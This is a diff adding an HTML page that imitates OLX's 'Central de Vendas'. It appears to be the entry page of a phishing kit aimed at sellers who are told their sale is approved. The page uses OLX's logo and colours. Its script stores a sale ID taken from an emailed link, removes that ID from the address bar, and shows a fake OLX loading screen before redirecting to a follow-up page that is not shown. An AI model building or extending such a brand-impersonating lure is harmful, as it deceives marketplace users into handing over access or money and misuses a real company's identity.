@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Central de Vendas - OLX</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 20px;
+            padding: 25px 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        /* Logo topo */
+        .topo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .topo img {
+            width: 60px;
+        }
+
+        /* Título */
+        .title {
+            text-align: center;
+            color: #6a0dad;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        /* Logo dentro */
+        .logo-card {
+            width: 55px;
+            display: block;
+            margin: 0 auto 15px;
+        }
+
+        /* Card */
+        .card {
+            background: #e6d6ff;
+            border-radius: 15px;
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 25px;
+        }
+
+        .card p {
+            font-size: 14px;
+            color: #333;
+            text-align: center;
+            flex: 1;
+        }
+
+        .arrow {
+            font-size: 22px;
+            color: #6a0dad;
+            margin-left: 10px;
+        }
+
+        /* Botão */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 25px;
+            background: #ff7a00;
+            color: #fff;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .btn:hover {
+            background: #e66c00;
+        }
+
+        /* Termos */
+        .termos {
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        /* Atenção */
+        .atencao h2 {
+            text-align: center;
+            color: #6a0dad;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .atencao p {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* ===== LOADING SCREEN ===== */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f2f4f5;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .loading-header {
+            margin-bottom: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .loading-logo {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -1px;
+        }
+
+        .loading-logo span:nth-child(1) { color: #6e0ad6; }
+        .loading-logo span:nth-child(2) { color: #00a650; }
+        .loading-logo span:nth-child(3) { color: #ff6a00; }
+
+        .spinner-simple {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #6e0ad6;
+            border-radius: 50%;
+            animation: spinSimple 1s linear infinite;
+        }
+
+        @keyframes spinSimple {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-header">
+            <div class="loading-logo">
+                <span>o</span><span>l</span><span>x</span>
+            </div>
+        </div>
+        <div class="spinner-simple"></div>
+        <div class="loading-text">Carregando...</div>
+    </div>
+
+    <div class="container">
+
+        <!-- Logo topo -->
+        <div class="topo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png" alt="OLX">
+        </div>
+
+        <!-- Título -->
+        <div class="title">Central de vendas</div>
+
+        <!-- Logo central -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png" class="logo-card">
+
+        <!-- Card -->
+        <div class="card">
+            <p>
+                Olá, seja bem vindo à central de vendas aprovadas,
+                clique em "avançar" e saiba mais sobre a sua venda
+            </p>
+            <div class="arrow">➤</div>
+        </div>
+
+        <!-- Botão -->
+        <a href="acesso.html" class="btn" onclick="mostrarLoading(event)" style="display: inline-block; text-align: center; text-decoration: none;">Avançar</a>
+
+        <!-- Termos -->
+        <div class="termos">
+            Termos de Uso e Política de Privacidade da OLX e seus parceiros,
+            e receber comunicações da OLX
+        </div>
+
+        <!-- Atenção -->
+        <div class="atencao">
+            <h2>Atenção</h2>
+            <p>
+                Lembrando que essa central só é disponível para quem está
+                realizando a venda com retirada por conta do comprador
+            </p>
+        </div>
+
+    </div>
+
+    <script>
+        // Verificar se há ID da venda na URL (vem do link do email)
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const vendaId = urlParams.get('id');
+            
+            if (vendaId) {
+                // Armazenar o ID da venda para usar no fluxo
+                localStorage.setItem('vendaId', vendaId);
+                console.log('ID da venda armazenado:', vendaId);
+
+                // Ocultar o id da URL sem recarregar a página
+                window.history.replaceState(null, '', window.location.pathname);
+            }
+        });
+
+        function mostrarLoading(e) {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            loadingOverlay.classList.add('active');
+            setTimeout(() => {
+                window.location.href = e.target.href;
+            }, 2000);
+            e.preventDefault();
+        }
+    </script>
+</body>
+</html>
